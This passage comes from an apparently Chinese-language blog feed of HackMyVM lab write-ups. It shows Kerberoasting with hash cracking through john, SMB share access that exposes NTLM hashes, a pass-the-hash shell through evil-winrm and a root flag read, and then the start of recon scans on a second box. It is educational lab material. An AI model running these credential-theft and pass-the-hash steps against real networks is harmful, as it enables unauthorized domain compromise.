variable">$a43ff3edc2fa9b462c82fcf119ef0f99242492ebad89c47cda0296c3975fd845f5159cc3485cfeb3796575735d86b1051b6f70f01a169309bec0e3c5844155c795524f7d672e884d69ef0e58ee86e2231575f9556302631ea341c652d77542f5101a2ff87035a0df163586aae6b210f9ac63b004d7ee350c5b63013b28fa48bc7c1f21d827852c2588e33f102a2679777445a31c7d938d4badb3a82afe50c72a86d447062febb58a65fd441e0b1213f1382ac9ff8eded263657a7adc1e54a845ae8b42501fbcc2744b33872b2c835ea50d3f45a18fda498108acc271204ebb3c5eacaa0228538ed9b908d142e6f258aa911c99d5f501d26518095685967e6a11fc4af6e90908b52729731307a7eebc7ac3a5246238d0b7674f3ff71c7a006377ae48d9038d2ad2af1fb6ea35f25c469a27bd02442e80aa4cdc392dd3ec47b1316ce1b15226a726e739138517a263c08ec1a6c84c033347e1e9e3f25682fb81f8a0b5b475b39beb1d4305f4b1b32ab4c6e4e1c6b1ead93a1f25698a35ba8f052bc2edf4a543b715533dd9a09966145a468e35a0f9d9e246c7ecf240106fb7dcc9fba852c6917f729de8231054424e2a0d263713597edebbed59a0bd16f858fc4a082315165bc1ef88126f896e7131476042a3dbf0c2e581dedea536fc042088afbbc1a0bb91c15c9b94380f4157a1ed63d872be6ba45467a68288ceb26824ff09f2d94b521810cdfc3d90e3bfc93c0502143cf8cad74d37fc4431c4484ffc0cb36baf6730cd22bde31e96fc81460291be8dc5d2e989ff51a7b91c25d1945849c984c6daa96bc7fd7b2c5df01e7dbba5097c677dc50b25103ed12cca9bbdf811b2f2ad4681dc583db8cd13a03ef8763c86c581532b5871a150cd52fcf87e0652fa6d2775ff6655e8523c13cff3a65f7ef1bb8b562af71118a5ba8c7ac950ed8bd0b35115c15728ed3b06ff1eb9acef0502b970ae8992ce83cded0b5aecfe61e69fb229d6f6a75d38a8dec0d5688939e5f6885252fb31ca311f6b7be13e613a1dcf8c1c6ee42ccd4b9e6287356fef8164aeb8ff8f3dcb9eed30b376f2c31c3baffebbe726ec750f3f877c39d71c57c0ef8ef84fb6a3bc62f715297430fbb94c587639894e286e555d280bea8cf33e66ef903886d2009f1c6fbab6639a1c2f4a1a5604a050ce578f093ec8f3899d3e5b21de2b10b9001577eda6322c1d8ddf55c1242a765cb6020c5dbee296a23b7422c784f542d2bc917fcfbda4b173af9cf459f8e31114a71c40291e91899f896151a307220f6c4c3abb127107d9bb25c100999802e6e4ff1f4811ad2f613a9a8240de720cd96343212d57101696278bdafa395a0970d68e1ec2f74878a6a18fa78e743fc1e2819e5f564489eb33163b3dc92534f0144d8ee980086f874c120240c4ef95844b6a502235c897940afb323f14817e566c1dae22c08ea6204c6985aa6e80f929ce565b619627c673d1f3d2</span>
<span class="token variable">$krb5tgs</span><span class="token variable">$23</span><span class="token variable">$*</span>web_svc<span class="token variable">$SOUPEDECODE</span>.LOCAL<span class="token variable">$HTTP</span>/WebServer*<span class="token variable">$a8a4ea82594dfa2f43915f0e31ace64d</span><span class="token variable">$563968fbcf0c5af63ec5000b270a83178254a0f2069c31951d8bd5a5214dce8d70e718db1b91193b94b200c450a1a1e86a1b3a435c7ddf4ac6b8516b151ad6fe5b5cadfe789ea09bc691e5bb8ec84580a6de22a265fee147d14980b1e752d19eba428c392a2bc6ece62f23357faa5162fecd68f0905f8f7f4fff2d120da7ebe91b4a50c4f0c99fc7195c8706870c406d3ac1b402d9c4e88b6b6385441169752771f604ba2fe5bdd30a353d527fe4e603c01194d614d24efde79810f6d9b3690924662f4f8f92d73469bddc7cc9dcfcab27e237a03a9edb1695a3cd61ce582710ed17ebf2b7da03f01f2a7c856c9dbfb7976b9321198e97057fe5a1ffe89f20b5805e2e4b5e3509bc50eff404a148c4317610cfd62f3f7a879fc081ecfd9d208e34d0efbc74c4733f411d04ea61259af26f8beee518fafc13420057a4521b0790952708d8d0263f067263a9fbbbd423fa7c7e73bea0e3ea4941236b55abd439fd76de50cb812129580949d75fb4fc821b36db63df59c569217fca0fdccba9d2d0ef5be3be137e3e2121503ee18e618cdb9c55a144b0b338bc5eaf5eeb5810690c5735fa3dd7f76d4b655afae087f2deccd52f57a3700445391f53bd2dd18d710f00402b7bbdedc1290e39ad634a1c1247565c4a6b8311a311c75ff46f686a231cc6ece228a0a69082a18acf9d9956931f3c709fae86dc962437c280b8c1715f413cc941ea8e08f864cdefdcdb9021e4e17d9e5fb0d74362a905a770d7788e628c75811e290afe2a9986d6b5a5d1113823c27579ec0cf4342bb05a9c63aad389d8b2105ea3d8ecace920adfb67ab8eff17819a0d624c8afe6431fda6e3d7c0af6f72e75a41c64ebb21caca095460c40ec3b56edd171e2a8db507b5c556e5084f0997f60f63f86f7191bc4276e528f5d1aef93ece516d39805ea8ebc25740eccc5c54ce63631a2dda2daa7a848d41a499149eb40e95b63cefa93147450997c82c224ece59f275b5c2e6260a5650302f5ea83801a9a2e3cf37841f97c82edeec629c08d460c5a57b1cc5b5727ef0aa9c2181cb30c2ea74ed7d146e88932888968b95cea497101ac9b2a0dc955ec27cb6f7b4d52b770227b0dd8668dd644e40c4baa3fe999824717fe1e016b7ceb709d4a71ada4339bf4612f1c9062991067a0690494f9d7e68a19a38d0266b14e4a70de72f02ba7c6a73895e6278edcd2096a09aa4abc197c357f546594be6d8284a5e88b2bd03a257cfa7fcad0eed13459e1287999dba8a9d1af63e684d01302a269c77b8c0f19e96e5be56e9efa7569c72609a0e3a2884bf635453f6e237a0d9bde8e1d088e9d472995e16ecf39b909afb28d631cfea9676f0e00d5f98df009365f9e0b96aef92421bc44503625d9d0c5a8409f1b6d2af5c4f047b056b877a6d12c39a460b62463c10a7f3f2cd7e4c7276973a6869f977d49e1370ce555357477658</span></code></pre>
<p>hash保存用john跑一下</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> john aa <span class="token parameter variable">--wordlist</span><span class="token operator">=</span>/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded <span class="token number">5</span> password hashes with <span class="token number">5</span> different salts <span class="token punctuation">(</span>krb5tgs, Kerberos <span class="token number">5</span> TGS etype <span class="token number">23</span> <span class="token punctuation">[</span>MD4 HMAC-MD5 RC4<span class="token punctuation">]</span><span class="token punctuation">)</span>
Press <span class="token string">'q'</span> or Ctrl-C to abort, almost any other key <span class="token keyword">for</span> status
Password123<span class="token operator">!</span><span class="token operator">!</span>    <span class="token punctuation">(</span>?<span class="token punctuation">)</span>     
1g <span class="token number">0</span>:00:01:11 DONE <span class="token punctuation">(</span><span class="token number">2024</span>-07-16 05:58<span class="token punctuation">)</span> <span class="token number">0</span>.01403g/s 201259p/s 955614c/s 955614C/s        <span class="token number">1</span><span class="token punctuation">..</span>1cm
Use the <span class="token string">"--show"</span> option to display all of the cracked passwords reliably
Session completed. </code></pre>
<p>拿到一个密码<code>Password123!!</code>,而且是file_svc的密码，那么尝试访问目录</p>
<h2 id="PTH攻击"><a href="#PTH攻击" class="headerlink" title="PTH攻击"></a>PTH攻击</h2><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> smbclient //192.168.56.128/backup <span class="token parameter variable">-U</span> file_svc
Password <span class="token keyword">for</span> <span class="token punctuation">[</span>WORKGROUP<span class="token punctuation">\</span>file_svc<span class="token punctuation">]</span>:
Try <span class="token string">"help"</span> to get a list of possible commands.
smb: <span class="token punctuation">\</span><span class="token operator">></span> <span class="token function">ls</span>
  <span class="token builtin class-name">.</span>                                   D        <span class="token number">0</span>  Tue Jun <span class="token number">18</span> 01:41:17 <span class="token number">2024</span>
  <span class="token punctuation">..</span>                                 DR        <span class="token number">0</span>  Tue Jun <span class="token number">18</span> 01:44:56 <span class="token number">2024</span>
  backup_extract.txt                  A      <span class="token number">892</span>  Mon Jun <span class="token number">17</span> <span class="token number">16</span>:41:05 <span class="token number">2024</span>

                <span class="token number">12942591</span> blocks of size <span class="token number">4096</span>. <span class="token number">10794376</span> blocks available</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> <span class="token function">cat</span> backup_extract.txt                   
WebServer$:2119:aad3b435b51404eeaad3b435b51404ee:c47b45f5d4df5a494bd19f13e14f7902:::
DatabaseServer$:2120:aad3b435b51404eeaad3b435b51404ee:406b424c7b483a42458bf6f545c936f7:::
CitrixServer$:2122:aad3b435b51404eeaad3b435b51404ee:48fc7eca9af236d7849273990f6c5117:::
FileServer$:2065:aad3b435b51404eeaad3b435b51404ee:e41da7e79a4c76dbd9cf79d1cb325559:::
MailServer$:2124:aad3b435b51404eeaad3b435b51404ee:46a4655f18def136b3bfab7b0b4e70e3:::
BackupServer$:2125:aad3b435b51404eeaad3b435b51404ee:46a4655f18def136b3bfab7b0b4e70e3:::
ApplicationServer$:2126:aad3b435b51404eeaad3b435b51404ee:8cd90ac6cba6dde9d8038b068c17e9f5:::
PrintServer$:2127:aad3b435b51404eeaad3b435b51404ee:b8a38c432ac59ed00b2a373f4f050d28:::
ProxyServer$:2128:aad3b435b51404eeaad3b435b51404ee:4e3f0bb3e5b6e3e662611b1a87988881:::
MonitoringServer$:2129:aad3b435b51404eeaad3b435b51404ee:48fc7eca9af236d7849273990f6c5117:::</code></pre>
<p>拿到了一些服务的hash，尝试使用哈希传递攻击</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> evil-winrm <span class="token parameter variable">-i</span> <span class="token number">192.168</span>.56.128 <span class="token parameter variable">-u</span> FileServer$ <span class="token parameter variable">-H</span> e41da7e79a4c76dbd9cf79d1cb325559
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">function</span> is unimplemented on this machine                                                                                                                       
                                        
Data: For <span class="token function">more</span> information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm<span class="token comment">#Remote-path-completion</span>
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>FileServer$<span class="token punctuation">\</span>Documents<span class="token operator">></span> <span class="token function">whoami</span>
soupedecode<span class="token punctuation">\</span>fileserver$</code></pre>
<p>拿到了shell</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">*Evil-WinRM* PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>FileServer$<span class="token punctuation">\</span>Documents<span class="token operator">></span> <span class="token function">whoami</span> /all

<span class="token environment constant">USER</span> INFORMATION
----------------

User Name               SID
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span> <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>
soupedecode<span class="token punctuation">\</span>fileserver$ S-1-5-21-2986980474-46765180-2505414164-2065


GROUP INFORMATION
-----------------

Group Name                                         Type             SID                                         Attributes
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span> <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span> <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span> <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
SOUPEDECODE<span class="token punctuation">\</span>Domain Computers                       Group            S-1-5-21-2986980474-46765180-2505414164-515 Mandatory group, Enabled by default, Enabled group
Everyone                                           Well-known group S-1-1-0                                     Mandatory group, Enabled by default, Enabled group
BUILTIN<span class="token punctuation">\</span>Pre-Windows <span class="token number">2000</span> Compatible Access         Alias            S-1-5-32-554                                Mandatory group, Enabled by default, Enabled group
BUILTIN<span class="token punctuation">\</span>Users                                      Alias            S-1-5-32-545                                Mandatory group, Enabled by default, Enabled group
BUILTIN<span class="token punctuation">\</span>Administrators                             Alias            S-1-5-32-544                                Mandatory group, Enabled by default, Enabled group, Group owner
NT AUTHORITY<span class="token punctuation">\</span>NETWORK                               Well-known group S-1-5-2                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY<span class="token punctuation">\</span>Authenticated Users                   Well-known group S-1-5-11                                    Mandatory group, Enabled by default, Enabled group
NT AUTHORITY<span class="token punctuation">\</span>This Organization                     Well-known group S-1-5-15                                    Mandatory group, Enabled by default, Enabled group
SOUPEDECODE<span class="token punctuation">\</span>Enterprise Admins                      Group            S-1-5-21-2986980474-46765180-2505414164-519 Mandatory group, Enabled by default, Enabled group
SOUPEDECODE<span class="token punctuation">\</span>Denied RODC Password Replication Group Alias            S-1-5-21-2986980474-46765180-2505414164-572 Mandatory group, Enabled by default, Enabled group, Local Group
NT AUTHORITY<span class="token punctuation">\</span>NTLM Authentication                   Well-known group S-1-5-64-10                                 Mandatory group, Enabled by default, Enabled group
Mandatory Label<span class="token punctuation">\</span>High Mandatory Level               Label            S-1-16-12288


PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span> <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span> <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
SeIncreaseQuotaPrivilege                  Adjust memory quotas <span class="token keyword">for</span> a process                                 Enabled
SeMachineAccountPrivilege                 Add workstations to domain                                         Enabled
SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
SeSystemProfilePrivilege                  Profile system performance                                         Enabled
SeSystemtimePrivilege                     Change the system <span class="token function">time</span>                                             Enabled
SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
SeBackupPrivilege                         Back up files and directories                                      Enabled
SeRestorePrivilege                        Restore files and directories                                      Enabled
SeShutdownPrivilege                       Shut down the system                                               Enabled
SeDebugPrivilege                          Debug programs                                                     Enabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force <span class="token function">shutdown</span> from a remote system                                Enabled
SeUndockPrivilege                         Remove computer from docking station                               Enabled
SeEnableDelegationPrivilege               Enable computer and user accounts to be trusted <span class="token keyword">for</span> delegation     Enabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working <span class="token builtin class-name">set</span>                                     Enabled
SeTimeZonePrivilege                       Change the <span class="token function">time</span> zone                                               Enabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token <span class="token keyword">for</span> another user <span class="token keyword">in</span> the same session Enabled


<span class="token environment constant">USER</span> CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support <span class="token keyword">for</span> Dynamic Access Control on this device has been disabled.</code></pre>
<p>可以看到FileServer属于管理员组,直接能读Administrator下面的root flag</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">*Evil-WinRM* PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Administrator<span class="token punctuation">\</span>Desktop<span class="token operator">></span> <span class="token builtin class-name">type</span> root.txt
a9564*********ad5ec60a</code></pre>







]]></content>
      <categories>
        <category>HackMyVM</category>
      </categories>
      <tags>
        <tag>SMB用户枚举</tag>
        <tag>kerberoasting攻击</tag>
        <tag>PTH攻击</tag>
      </tags>
  </entry>
  <entry>
    <title>HackMyVM-Dentacare</title>
    <url>/posts/b99628b9/</url>
    <content><![CDATA[<p><strong>难度:medium</strong></p>
<p><strong>kali:192.168.56.104</strong></p>
<p><strong>靶机:192.168.56.176</strong></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># arp-scan -l</span>
Interface: eth0, type: EN10MB, MAC: 00:0c:29:d2:e0:49, IPv4: <span class="token number">192.168</span>.56.104
Starting arp-scan <span class="token number">1.10</span>.0 with <span class="token number">256</span> hosts <span class="token punctuation">(</span>https://github.com/royhills/arp-scan<span class="token punctuation">)</span>
<span class="token number">192.168</span>.56.1    0a:00:27:00:00:05       <span class="token punctuation">(</span>Unknown: locally administered<span class="token punctuation">)</span>
<span class="token number">192.168</span>.56.100  08:00:27:ec:26:13       PCS Systemtechnik GmbH
<span class="token number">192.168</span>.56.176  08:00:27:eb:b5:d0       PCS Systemtechnik GmbH

<span class="token number">3</span> packets received by filter, <span class="token number">0</span> packets dropped by kernel
Ending arp-scan <span class="token number">1.10</span>.0: <span class="token number">256</span> hosts scanned <span class="token keyword">in</span> <span class="token number">2.021</span> seconds <span class="token punctuation">(</span><span class="token number">126.67</span> hosts/sec<span class="token punctuation">)</span>. <span class="token number">3</span> responded</code></pre>
<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># nmap 192.168.56.176 -sV -A -p-</span>
Starting Nmap <span class="token number">7</span>.94SVN <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2024</span>-06-02 <span class="token number">21</span>:38 CST
Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.56.176
Host is up <span class="token punctuation">(</span><span class="token number">0</span>.00068s latency<span class="token punctuation">)</span>.
Not shown: <span class="token number">65532</span> closed tcp ports <span class="token punctuation">(</span>reset<span class="token punctuation">)</span>
PORT     STATE SERVICE VERSION
<span class="token number">22</span>/tcp   <span class="token function">open</span>  <span class="token function">ssh</span>     OpenSSH <span class="token number">9</span>.2p1 Debian <span class="token number">2</span>+deb12u2 <span class="token punctuation">(</span>protocol <span class="token number">2.0</span><span class="token punctuation">)</span>
<span class="token operator">|</span> ssh-hostkey: 
<span class="token operator">|</span>   <span class="token number">256</span> e7:ce:f2:f6:5d:a7:47:5a:16:2f:90:07:07:33:4e:a9 <span class="token punctuation">(</span>ECDSA<span class="token punctuation">)</span>
<span class="token operator">|</span>_  <span class="token number">256</span> 09:db:b7:e8:ee:d4:52:b8:49:c3:cc:29:a5:6e:07:35 <span class="token punctuation">(</span>ED25519<span class="token punctuation">)</span>
<span class="token number">80</span>/tcp   <span class="token function">open</span>  http    Werkzeug/3.0.2 Python/3.11.2
<span class="token operator">|</span>_http-server-header: Werkzeug/3.0.2 Python/3.11.2
<span class="token operator">|</span> fingerprint-strings: 
<span class="token operator">|</span>   GetRequest: 
<span class="token operator">|</span>     HTTP/1.1 <span class="token number">200</span> OK
<span class="token operator">|</span>     Server: Werkzeug/3.0.2 Python/3.11.2
<span class="token operator">|</span>     Date: Sun, 02 Jun <span class="token number">2024</span> <span class="token number">13</span>:38:53 GMT
<span class="token operator">|</span>     Content-Type: text/html<span class="token punctuation">;</span> <span class="token assign-left variable">charset</span><span class="token operator">=</span>utf-8
<span class="token operator">|</span>     Content-Length: <span class="token number">43069</span>
<span class="token operator">|</span>     Connection: close
<span class="token operator">|</span>     <span class="token operator">&lt;</span><span class="token operator">!</span>DOCTYPE html<span class="token operator">></span>
<span class="token operator">|</span>     <span class="token operator">&lt;</span>html <span class="token assign-left variable">lang</span><span class="token operator">=</span><span class="token string">"en"</span><span class="token operator">></span>
<span class="token operator">|</span>     <span class="token operator">&lt;</span>head<span class="token operator">></span>
<span class="token operator">|</span>     <span class="token operator">&lt;</span>title<span class="token operator">></span>DentaCare Corporation<span class="token operator">&lt;</span>/title<span class="token operator">></span>
<span class="token operator">|</span>     <span class="token operator">&lt;</span>meta <span class="token assign-left variable">charset</span><span class="token operator">=</span><span class="token string">"utf-8"</span><span class="token operator">></span>
<span class="token operator">|</span>     <span class="token operator">&lt;</span>meta <span class="token assign-left variable">name</span><span class="token operator">=</span><span class="token string">"viewport"</span> <span class="token assign-left variable">content</span><span class="token operator">=</span><span class="token string">"width=device-width, initial-scale=1, shrink-to-fit=no"</span><span class="token operator">></span>
<span class="token operator">|</span>     <span class="token operator">&lt;</span>link <span class="token assign-left variable">href</span><span class="token operator">=</span><span class="token string">"https://fonts.googleapis.com/css?family=Open+Sans:300,400,500,600,700"</span> <span class="token assign-left variable">rel</span><span class="token operator">=</span><span class="token string">"stylesheet"</span><span class="token operator">></span>
<span class="token operator">|</span>     <span class="token operator">&lt;</span>link <span class="token assign-left variable">rel</span><span class="token operator">=</span><span class="token string">"stylesheet"</span> <span class="token assign-left variable">href</span><span class="token operator">=</span><span class="token string">"../static/css/open-iconic-bootstrap.min.css"</span><span class="token operator">></span>
<span class="token operator">|</span>     <span class="token operator">&lt;</span>link <span class="token assign-left variable">rel</span><span class="token operator">=</span><span class="token string">"stylesheet"</span> <span class="token assign-left variable">href</span><span class="token operator">=</span><span class="token string">"../static/css/animate.css"</span><span class="token operator">></span>
<span class="token operator">|</span>     <span class="token operator">&lt;</span>link <span class="token assign-left variable">rel</span><span class="token operator">=</span><span class="token string">"stylesheet"</span> <span class="token assign-left variable">href</span><span class="token operator">=</span><span class="token string">"../static/css/owl.carousel.min.css"</span><span class="token operator">></span>
<span class="token operator">|</span>     <span class="token operator">&lt;</span>link <span class="token assign-left variable">rel</span><span class="token operator">=</span><span class="token string">"stylesheet"</span> <span class="token assign-left variable">href</span><span class="token operator">=</span><span class="token string">"../static/css/owl.theme.default.min.css"</span><span class="token operator">></span>
<span class="token operator">|</span>     <span class="token operator">&lt;</span>link <span class="token assign-left variable">rel</span><span class="token operator">=</span><span class="token string">"stylesheet"</span> <span class="token assign-left variable">href</span><span class="token operator">=</span><span class="token string">"../static/css/magnific-popup.css"</span><span class="token operator">></span>
<span class="token operator">|</span>     <span class="token operator">&lt;</span>link <span class="token assign-left variable">rel</span><span class="token operator">=</span><span class="token string">"stylesheet"</span> <span class="token assign-left variable">href</span><span class="token operator">=</span><span class="token string">"../static/css/aos.css"</span><span class="token operator">></span>
<span class="token operator">|</span>     <span class="token operator">&lt;</span>lin
<span class="token operator">|</span>   HTTPOptions: 
<span class="token operator">|</span>     HTTP/1.1 <span class="token number">200</span> OK
<span class="token operator">|</span>     Server: Werkzeug/3.0.2 Python/3.11.2
<span class="token operator">|</span>     Date: Sun, 02 Jun <span class="token number">2024</span> <span class="token number">13</span>:38:53 GMT
<span class="token operator">|</span>     Content-Type: text/html<span class="token punctuation">;</span> <span class="token assign-left variable">charset</span><span class="token operator">=</span>utf-8
<span class="token operator">|</span>     Allow: HEAD, GET, OPTIONS
<span class="token operator">|</span>     Content-Length: <span class="token number">0</span>
<span class="token operator">|</span>     Connection: close
<span class="token operator">|</span>   RTSPRequest: 
<span class="token operator">|</span>     <span class="token operator">&lt;</span><span class="token operator">!</span>DOCTYPE HTML<span class="token operator">></span>
<span class="token operator">|</span>     <span class="token operator">&lt;</span>html <span class="token assign-left variable">lang</span><span class="token operator">=</span><span class="token string">"en"</span><span class="token operator">></span>
<span class="token operator">|</span>     <span class="token operator">&lt;</span>head<span class="token operator">></span>
<span class="token operator">|</span>     <span class="token operator">&lt;</span>meta <span class="token assign-left variable">charset</span><span class="token operator">=</span><span class="token string">"utf-8"</span><span class="token operator">></span>
<span class="token operator">|</span>     <span class="token operator">&lt;</span>title<span class="token operator">></span>Error response<span class="token operator">&lt;</span>/title<span class="token operator">></span>
<span class="token operator">|</span>     <span class="token operator">&lt;</span>/head<span class="token operator">></span>
<span class="token operator">|</span>     <span class="token operator">&lt;</span>body<span class="token operator">></span>
<span class="token operator">|</span>     <span class="token operator">&lt;</span>h<span class="token operator"><span class="token file-descriptor important">1</span>></span>Error response<span class="token operator">&lt;</span>/h<span class="token operator"><span class="token file-descriptor important">1</span>></span>
<span class="token operator">|</span>     <span class="token operator">&lt;</span>p<span class="token operator">></span>Error code: <span class="token number">40</span><span class="token operator"><span class="token file-descriptor important">0</span>&lt;</span>/p<span class="token operator">></span>
<span class="token operator">|</span>     <span class="token operator">&lt;</span>p<span class="token operator">></span>Message: Bad request version <span class="token punctuation">(</span><span class="token string">'RTSP/1.0'</span><span class="token punctuation">)</span>.<span class="token operator">&lt;</span>/p<span class="token operator">></span>
<span class="token operator">|</span>     <span class="token operator">&lt;</span>p<span class="token operator">></span>Error code explanation: <span class="token number">400</span> - Bad request syntax or unsupported method.<span class="token operator">&lt;</span>/p<span class="token operator">></span>
<span class="token operator">|</span>     <span class="token operator">&lt;</span>/body<span class="token operator">></span>
<span class="token operator">|</span>_    <span class="token operator">&lt;</span>/html<span class="token operator">></span>
<span class="token operator">|</span>_http-title: DentaCare Corporation
<span class="token number">8000</span>/tcp <span class="token function">open</span>  http    Apache httpd <span class="token number">2.4</span>.57
<span class="token operator">|</span>_http-server-header: Apache/2.4.57 <span class="token punctuation">(</span>Debian<span class="token punctuation">)</span>
<span class="token operator">|</span>_http-title: <span class="token number">403</span> Forbidden
<span class="token number">1</span> <span class="token function">service</span> unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service <span class="token builtin class-name">:</span>
SF-Port80-TCP:V<span class="token operator">=</span><span class="token number">7</span>.94SVN%I<span class="token operator">=</span><span class="token number">7</span>%D<span class="token operator">=</span><span class="token number">6</span>/2%Time<span class="token operator">=</span>665C75EE%P<span class="token operator">=</span>x86_64-pc-linux-gnu%r<span class="token punctuation">(</span>Ge
SF:tRequest,1CF8,<span class="token string">"HTTP/1\.1<span class="token entity" title="\x20">\x20</span>200<span class="token entity" title="\x20">\x20</span>OK<span class="token entity" title="\r">\r</span><span class="token entity" title="\n">\n</span>Server:<span class="token entity" title="\x20">\x20</span>Werkzeug/3\.0\.2<span class="token entity" title="\x2">\x2</span>
SF:0Python/3\.11\.2<span class="token entity" title="\r">\r</span><span class="token entity" title="\n">\n</span>Date:<span class="token entity" title="\x20">\x20</span>Sun,<span class="token entity" title="\x20">\x20</span>02<span class="token entity" title="\x20">\x20</span>Jun<span class="token entity" title="\x20">\x20</span>2024<span class="token entity" title="\x20">\x20</span>13:38:53<span class="token entity" title="\x20">\x20</span>G
